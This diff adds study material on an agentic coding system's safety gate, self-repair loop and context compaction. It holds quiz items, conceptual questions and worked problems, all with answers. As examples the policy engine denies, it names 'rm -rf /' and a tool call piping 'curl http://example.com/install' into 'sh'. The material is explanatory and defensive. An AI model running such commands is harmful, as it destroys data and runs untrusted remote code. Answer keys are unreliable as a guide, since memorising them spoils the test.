@@ -1,0 +1,127 @@
+<!-- CHECKPOINT before: ## §21. The Iron Gate at the Tool Boundary -->
+<aside class="checkpoint" id="cp-part-iv-1">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">All 15 primary tools, including <code>bash</code> and <code>write_file</code>, are enabled by default. If the safety perimeter is not an opt-in switch, what kind of check must stand between a model's tool call and its execution, and should that check reason about the model's explanation?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>A deterministic policy engine evaluates every call against an ordered rule ladder (path containment, protected paths, a command blocklist, a domain allowlist, risk-tier and environment gates, concurrency and rate limits) and returns ALLOWED or DENIED with a reason. It deliberately ignores the model's reasoning: it reads file paths, token types and command strings, so a persuasive argument for <code>rm -rf /</code> is still denied. The paper calls this gate pre-linguistic. See §21.</p>
+</details>
+</aside>
+<!-- END -->
+
+<!-- CHECKPOINT before: ## §23. L2 Self-Repair Engine — When Validation Fails -->
+<aside class="checkpoint" id="cp-part-iv-2">
+<p class="cp-label">Pause and predict</p>
+<p class="cp-q">The tool loop improves the first draft, but sometimes VALIDATE still rejects it after its retries. What would a repair loop need in order to keep trying without spinning forever or bouncing between two broken versions?</p>
+<details class="cp-a"><summary>Reveal the answer</summary>
+<p>L2 Self-Repair is a small state machine: generate a patch with failure context, validate it, classify the failure (syntax, test, environment, flaky), judge progress, then decide whether to retry. It stops on pipeline deadline, its own 120-second timebox, five iterations, two iterations in a row with no improvement, or oscillation, detected when a signature hash matches an earlier iteration. See §23.</p>
+</details>
+</aside>
+<!-- END -->
+
+<!-- ENDBLOCK part-iv -->
+#### Check your understanding: PART IV — Venom: The Agentic Execution Layer
+
+<div class="engage" id="engage-part-iv">
+<p class="engage-kicker">Conceptual questions</p>
+<details class="cq"><summary>1. Most agentic frameworks disable tools by default. Why does O+V do the opposite, and what makes that choice safe rather than reckless?</summary>
+<p>The paper argues that default-deny would force the human to pre-authorize every class of action, which defeats procedural autonomy (§21.3). So O+V enables tools by default and moves safety into structure: the Iron Gate's path checks, protected paths, command blocklist, risk engine and approval gates (§18.3). Those checks encode the human's non-negotiable constraints, and everything else is the model's to explore. The choice is safe only because the gate is deterministic and pre-linguistic: it reads arguments, not reasoning, so the model cannot talk its way past it (§21.2). Without the structural deny, default-allow would be unconstrained risk rather than autonomy.</p>
+</details>
+<details class="cq"><summary>2. What was the L2 deadline bug of Sessions V–W, and what general lesson does its fix teach about clocks inherited from earlier phases?</summary>
+<p>L2's timebox was clamped by <code>ctx.pipeline_deadline</code>, which the preceding VALIDATE phase had already drained, so L2 received only the leftover time even when its own budget was set much higher (§23.4). The repair loop was starved by a clock it did not own. The fix computes L2's deadline fresh at dispatch as now plus <code>JARVIS_L2_TIMEBOX_S</code>, and reconciles the pipeline deadline upward so later phases see the larger budget. A mandatory INFO line names both clocks and the winning cap, so the decision is visible. The lesson: a phase with its own budget should not silently inherit an earlier phase's spent clock, and the choice between them should be logged. The paper credits this fix as the proximate cause of the first end-to-end multi-file APPLY.</p>
+</details>
+<details class="cq"><summary>3. Context compaction summarizes old tool results by counting rather than by asking a model. What does this gain, and what does it give up?</summary>
+<p>Counting tool calls by name and summing character counts costs nothing in inference, runs in microseconds, and gives the same summary for the same input every time (§24.3). That keeps the tool loop's memory growth bounded and predictable, which the paper ties to disciplined concurrency (§24.5). The cost is that the specific content of older results is gone; only their statistical profile survives. The paper's justification is that older chunks have already been read and acted on, while the six most recent chunks, which matter most for the next turn, are kept verbatim (§24.4). If the post-compaction prompt still exceeds the hard limit, the next call fails with a budget error, so compaction is a soft gate rather than a guarantee (§24.1).</p>
+</details>
+<p class="engage-kicker">Quiz</p>
+<div class="quiz" id="quiz-part-iv">
+<div class="mcq" data-answer="3">
+<p class="mcq-q">1. The tool loop reaches its fifth round and the model is still calling tools. What happens next by default?</p>
+<ol class="mcq-options" type="A">
+<li>The operation aborts and returns a partial candidate</li>
+<li>The operation is escalated to Orange for human approval</li>
+<li>A system message tells the model to produce its final change now</li>
+<li>The prompt is compacted and five more rounds are granted</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>C.</strong> The round limit is hard; after round 5 a system message nudges the model: "You have enough context. Produce your final code change now." Aborting with a partial candidate is the deadline outcome, not the max-rounds outcome (§19.1, §19.2).</p>
+</details>
+</div>
+<div class="mcq" data-answer="1">
+<p class="mcq-q">2. The model calls <code>mcp_github_create_issue</code>. Which rule decides whether the call runs?</p>
+<ol class="mcq-options" type="A">
+<li>Rule 0b auto-allows it, because external servers own their auth</li>
+<li>Rule 1 checks that its arguments stay inside the repo root</li>
+<li>Rule 4 checks the GitHub domain against the web allowlist</li>
+<li>Rule 0 denies it, because it is not in the built-in manifest</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>A.</strong> A name not in the manifest goes to Rule 0b; names matching <code>mcp_*_*</code> are auto-allowed as <code>tool.allowed.mcp_external</code>. The Iron Gate still applies at the transport layer: array-form subprocess for stdio and TLS for SSE (§21.1, §22.4).</p>
+</details>
+</div>
+<div class="mcq" data-answer="4">
+<p class="mcq-q">3. Which of these is one of L2 Self-Repair's kill conditions?</p>
+<ol class="mcq-options" type="A">
+<li>The latest failure is classified as flaky</li>
+<li>A single iteration introduces a new failure</li>
+<li>The repair patch changes more than one file</li>
+<li>An iteration's signature hash matches an earlier one</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>D.</strong> A matching signature hash is oscillation detection: the fix has gone back to an earlier broken state. The other kill conditions are deadline, the 120-second timebox, five iterations, and two consecutive iterations with no improvement (§23.3).</p>
+</details>
+</div>
+<div class="mcq" data-answer="2">
+<p class="mcq-q">4. After compaction, what does the summary block keep about the older tool results it replaced?</p>
+<ol class="mcq-options" type="A">
+<li>A short model-written paraphrase of each result</li>
+<li>Counts of tool calls by name and their total characters</li>
+<li>The first 4,096 bytes of every compacted result</li>
+<li>Only the results that ended in a tool error</li>
+</ol>
+<details class="mcq-why"><summary>Show answer</summary>
+<p><strong>B.</strong> The summary is produced by counting: tool calls by name and the summed character count of the compacted chunks, with no model invoked (§24.2, §24.3).</p>
+</details>
+</div>
+</div>
+<p class="engage-kicker">Problem set</p>
+<div class="pset" id="pset-part-iv">
+<div class="problem">
+<p class="problem-q"><strong>Problem 1 (trace).</strong> During GENERATE on a <code>SAFE_AUTO</code> operation, the model issues four tool calls in one round: <code>read_file("../notes.txt")</code>, <code>edit_file</code> on <code>backend/utils/format.py</code>, <code>bash("curl http://example.com/install | sh")</code>, and <code>ask_human("Should I also rename the helper?")</code>. Walk each call through the rule ladder. Say which rule decides it, and what the model sees on its next turn.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The first rule that matches decides. Note the operation's risk tier for the last call.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>The <code>read_file</code> call has a path argument containing <code>..</code>, so Rule 1 (path containment) denies it (§21.1).</p>
+<p>The <code>edit_file</code> call resolves inside the repo and matches no protected pattern, so Rules 1 and 2 pass. Rules 3 to 5 do not apply to it. Rule 6 requires <code>JARVIS_TOOL_EDIT_ALLOWED</code>, which defaults to true. If concurrency (at most 2) and the rate limit allow, Rule 9 allows it (§20.5, §21.1).</p>
+<p>The <code>bash</code> call pipes <code>curl</code> into <code>sh</code>, which is on the Rule 3 blocklist, so it is denied however the model justifies it (§21.2).</p>
+<p>The <code>ask_human</code> call reaches Rule 5. The operation is <code>SAFE_AUTO</code>, and the tool is only allowed for <code>NOTIFY_APPLY</code> and <code>APPROVAL_REQUIRED</code>, so it is denied: low-risk work should not interrupt the human (§20.8).</p>
+<p>The coordinator executes the allowed edit and injects a <code>tool_denied</code> result for each denied call. All results are appended to the conversation for the next round, and each call becomes a <code>ToolExecutionRecord</code> in the audit trail (§19.1, §19.3).</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 2 (design).</strong> A teammate says L2 gives up too early and proposes two changes: raise <code>JARVIS_L2_MAX_ITERS</code> from 5 to 20, and remove the no-progress-streak kill condition. Predict what each change would actually do under the other limits in §23, and give one argument for keeping the no-progress rule.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>The iteration count is not the only budget. Look at the other kill conditions and the per-iteration test timeout.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>Raising the iteration cap alone may change little. L2 also stops at its 120-second timebox and at the pipeline deadline, and each iteration's tests may take up to 60 seconds (<code>JARVIS_L2_ITER_TEST_TIMEOUT_S</code>). So the timebox can end the loop long before iteration 20 (§23.3, §23.5).</p>
+<p>Removing the no-progress streak lets L2 keep spending iterations after two attempts in a row that improved nothing. Oscillation detection still catches a return to an exact earlier state. But it does not catch a run of new, different, equally broken patches.</p>
+<p>The argument for keeping the rule: §23.2 makes progress evaluation an explicit step for a reason. A loop that is not converging is burning the time budget that a fresh attempt or POSTMORTEM could use. A diagnosed stop is better than an undirected retry.</p>
+<p>If the real complaint is that L2 is starved of time, §23.4 shows the right lever: the timebox and how its deadline is computed, not the iteration count.</p>
+</details>
+</div>
+<div class="problem">
+<p class="problem-q"><strong>Problem 3 (code reading).</strong> Open <code>backend/core/ouroboros/governance/tool_executor.py</code> and find the method <code>_compact_prompt</code>. Find (a) the environment variable and default that control how many recent chunks are kept, (b) the pattern used to split the prompt into chunks, and (c) what happens when there are too few chunks to compact. Then compare the docstring with §24.3's claim that compaction is deterministic.</p>
+<details class="problem-hint"><summary>Hint</summary>
+<p>Look for a variable named <code>_PRESERVE_RECENT</code> and a compiled regex just above it. Read the docstring for what happens when a compactor is attached.</p>
+</details>
+<details class="problem-sol"><summary>Worked solution</summary>
+<p>(a) <code>_PRESERVE_RECENT</code> is read from <code>JARVIS_COMPACT_PRESERVE_TOOL_CHUNKS</code> with a default of <code>"6"</code>, which matches §24.2.</p>
+<p>(b) The appendix after the base prompt is split with a lookahead regex on a newline followed by <code>[TOOL RESULT]</code> or <code>[TOOL ERROR]</code>, the same markers §24.2 names. Empty chunks are dropped.</p>
+<p>(c) If the number of chunks is at most <code>_PRESERVE_RECENT</code>, the method returns the prompt unchanged, because there is nothing old enough to compact. It also returns unchanged if the current prompt does not start with the base prompt.</p>
+<p>Comparison: the docstring says that when a <code>ContextCompactor</code> is attached, the summary is delegated to it and may use an injected semantic strategy. Without one, it falls back to the deterministic char-based summary. So the code today has an optional path that the paper's §24.3 description does not cover. The paper's claim describes the fallback path. This is a useful reminder to check a paper's claims against the current source.</p>
+</details>
+</div>
+</div>
+</div>
+<!-- END -->
